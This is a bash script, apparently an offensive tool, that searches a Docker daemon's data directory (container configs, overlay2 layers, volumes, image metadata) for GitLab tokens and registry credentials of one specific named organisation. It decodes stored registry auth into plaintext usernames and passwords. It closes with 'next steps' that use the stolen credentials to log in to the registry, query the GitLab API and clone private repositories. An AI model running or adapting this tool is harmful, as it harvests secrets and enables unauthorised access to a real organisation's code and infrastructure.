#!/bin/bash

DOCKER_DIR="/root_alpha/docker"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OUTPUT_FILE="docker_gitlab_extraction_$TIMESTAMP.txt"

echo "🚀 Docker Daemon GitLab Credential Extractor"
echo "=============================================="
echo "Target Directory: $DOCKER_DIR"
echo "Output File: $OUTPUT_FILE"
echo

# Function to search for GitLab patterns in files
search_gitlab_patterns() {
    local file="$1"
    local context="$2"
    
    # GitLab patterns to search for
    patterns=(
        "gitlab\.tigerbkk\.com"
        "docker-registry\.tigerbkk\.com"
        "CI_JOB_TOKEN"
        "CI_REGISTRY_PASSWORD"
        "GITLAB_TOKEN"
        "PRIVATE_TOKEN"
        "glpat-[a-zA-Z0-9_-]\{20,\}"
        "gldt-[a-zA-Z0-9_-]\{20,\}"
        "gitlab-ci-token"
        "GITLAB_USER_EMAIL"
        "CI_SERVER_URL"
    )
    
    for pattern in "${patterns[@]}"; do
        if grep -l "$pattern" "$file" 2>/dev/null; then
            echo "🎯 Found GitLab pattern '$pattern' in: $context"
            echo "📄 File: $file"
            echo "📋 Content:"
            grep -A2 -B2 "$pattern" "$file" 2>/dev/null | head -20
            echo "---"
        fi
    done
}

exec > >(tee "$OUTPUT_FILE")

echo "🔍 Phase 1: Searching Docker containers directory..."
if [ -d "$DOCKER_DIR/containers" ]; then
    echo "✅ Found containers directory"
    
    # Search through container config files
    find "$DOCKER_DIR/containers" -name "config.v2.json" -type f 2>/dev/null | while read -r config_file; do
        container_id=$(basename $(dirname "$config_file"))
        echo
        echo "📦 Analyzing container config: $container_id"
        
        # Check for GitLab-related content in container config
        if grep -q -i "gitlab\|tigerbkk\|ci_" "$config_file" 2>/dev/null; then
            echo "🎯 Found GitLab references in container config!"
            
            # Extract environment variables
            echo "🔑 Environment Variables:"
            jq -r '.Config.Env[]?' "$config_file" 2>/dev/null | grep -iE "(CI_|GITLAB|GIT_|RUNNER|TOKEN|REGISTRY)" | head -10
            
            # Extract image information
            echo "🐳 Image Information:"
            jq -r '.Config.Image' "$config_file" 2>/dev/null
            
            # Extract any command arguments that might contain tokens
            echo "⚡ Command Arguments:"
            jq -r '.Config.Cmd[]?' "$config_file" 2>/dev/null | grep -iE "(token|gitlab|ci)" | head -5
            
            echo "---"
        fi
        
        # Also check hostconfig.json if it exists
        hostconfig_file=$(dirname "$config_file")/hostconfig.json
        if [ -f "$hostconfig_file" ] && grep -q -i "gitlab\|tigerbkk" "$hostconfig_file" 2>/dev/null; then
            echo "🎯 Found GitLab references in host config!"
            grep -A2 -B2 -i "gitlab\|tigerbkk" "$hostconfig_file" | head -20
            echo "---"
        fi
    done
else
    echo "❌ Containers directory not found"
fi

echo
echo "🔍 Phase 2: Searching Docker image layers..."
if [ -d "$DOCKER_DIR/overlay2" ]; then
    echo "✅ Found overlay2 directory"
    
    # Search for GitLab-related files in image layers
    echo "📁 Looking for GitLab config files in layers..."
    find "$DOCKER_DIR/overlay2" -name "config.toml" -o -name ".gitlab-ci.yml" -o -name "gitlab.yml" 2>/dev/null | head -10 | while read -r gitlab_file; do
        if [ -f "$gitlab_file" ]; then
            echo "📄 Found GitLab config: $gitlab_file"
            search_gitlab_patterns "$gitlab_file" "overlay2_layer"
        fi
    done
    
    # Search for Docker registry credentials in layers
    echo "🔐 Looking for Docker registry configs in layers..."
    find "$DOCKER_DIR/overlay2" -path "*/.docker/config.json" 2>/dev/null | head -10 | while read -r docker_config; do
        if [ -f "$docker_config" ] && grep -q "tigerbkk\|gitlab" "$docker_config" 2>/dev/null; then
            echo "📄 Found Docker config with GitLab references: $docker_config"
            
            # Parse Docker config for registry auth
            echo "🔑 Registry Authentication:"
            python3 -c "
import json, base64, sys
try:
    with open('$docker_config', 'r') as f:
        config = json.load(f)
        auths = config.get('auths', {})
        for registry, auth_info in auths.items():
            if 'tigerbkk.com' in registry or 'gitlab' in registry:
                print(f'Registry: {registry}')
                if 'auth' in auth_info:
                    try:
                        decoded = base64.b64decode(auth_info['auth']).decode('utf-8')
                        username, password = decoded.split(':', 1)
                        print(f'Username: {username}')
                        print(f'Password/Token: {password}')
                    except:
                        print('Could not decode auth')
                print('---')
except Exception as e:
    print(f'Error parsing config: {e}')
" 2>/dev/null
        fi
    done
    
    # Search for environment files that might contain GitLab tokens
    echo "🌍 Looking for environment files with GitLab tokens..."
    find "$DOCKER_DIR/overlay2" -name "*.env" -o -name "*env*" 2>/dev/null | xargs grep -l -i "gitlab\|ci_\|token" 2>/dev/null | head -10 | while read -r env_file; do
        echo "📄 Found environment file with GitLab references: $env_file"
        grep -iE "(CI_|GITLAB|TOKEN)" "$env_file" 2>/dev/null | head -10
        echo "---"
    done
    
else
    echo "❌ Overlay2 directory not found"
fi

echo
echo "🔍 Phase 3: Searching Docker volumes..."
if [ -d "$DOCKER_DIR/volumes" ]; then
    echo "✅ Found volumes directory"
    
    # Search volumes for GitLab-related content
    find "$DOCKER_DIR/volumes" -type f -name "config.toml" -o -name "*.yml" -o -name "*.yaml" 2>/dev/null | while read -r volume_file; do
        if grep -q -i "gitlab\|runner\|ci" "$volume_file" 2>/dev/null; then
            echo "📄 Found GitLab-related file in volume: $volume_file"
            search_gitlab_patterns "$volume_file" "docker_volume"
        fi
    done
else
    echo "❌ Volumes directory not found"
fi

echo
echo "🔍 Phase 4: Searching Docker images metadata..."
if [ -d "$DOCKER_DIR/image" ]; then
    echo "✅ Found image directory"
    
    # Search image metadata for GitLab references
    find "$DOCKER_DIR/image" -name "*.json" 2>/dev/null | xargs grep -l "tigerbkk\|gitlab" 2>/dev/null | head -10 | while read -r image_file; do
        echo "📄 Found GitLab references in image metadata: $image_file"
        grep -A3 -B3 "tigerbkk\|gitlab" "$image_file" 2>/dev/null | head -20
        echo "---"
    done
else
    echo "❌ Image directory not found"
fi

echo
echo "🔍 Phase 5: Quick text search for common GitLab tokens..."
echo "🔍 Searching for common GitLab token patterns across all files..."

# Search for specific token patterns
token_patterns=(
    "glpat-[a-zA-Z0-9_-]\{20,\}"
    "gldt-[a-zA-Z0-9_-]\{20,\}"
    "gitlab-ci-token:[a-zA-Z0-9_-]\{10,\}"
    "CI_JOB_TOKEN=[a-zA-Z0-9_-]\{10,\}"
    "CI_REGISTRY_PASSWORD=[a-zA-Z0-9_-]\{10,\}"
)

for pattern in "${token_patterns[@]}"; do
    echo "🔍 Searching for pattern: $pattern"
    grep -r "$pattern" "$DOCKER_DIR" 2>/dev/null | head -5
done

echo
echo "🔍 Phase 6: Search for GitLab URLs and configuration..."
echo "🔍 Looking for GitLab server URLs and configuration..."

# Search for GitLab URLs
grep -r "gitlab\.tigerbkk\.com" "$DOCKER_DIR" 2>/dev/null | head -10
grep -r "docker-registry\.tigerbkk\.com" "$DOCKER_DIR" 2>/dev/null | head -10

echo
echo "✅ Docker daemon GitLab extraction completed!"
echo "📊 Results saved to: $OUTPUT_FILE"
echo
echo "🎯 Next steps if credentials were found:"
echo "1. Test Docker registry login: docker login docker-registry.tigerbkk.com -u <username> -p <token>"
echo "2. Test GitLab API: curl -H 'PRIVATE-TOKEN: <token>' https://gitlab.tigerbkk.com/api/v4/user"
echo "3. Clone repositories: git clone https://gitlab-ci-token:<token>@gitlab.tigerbkk.com/sen/project.git"
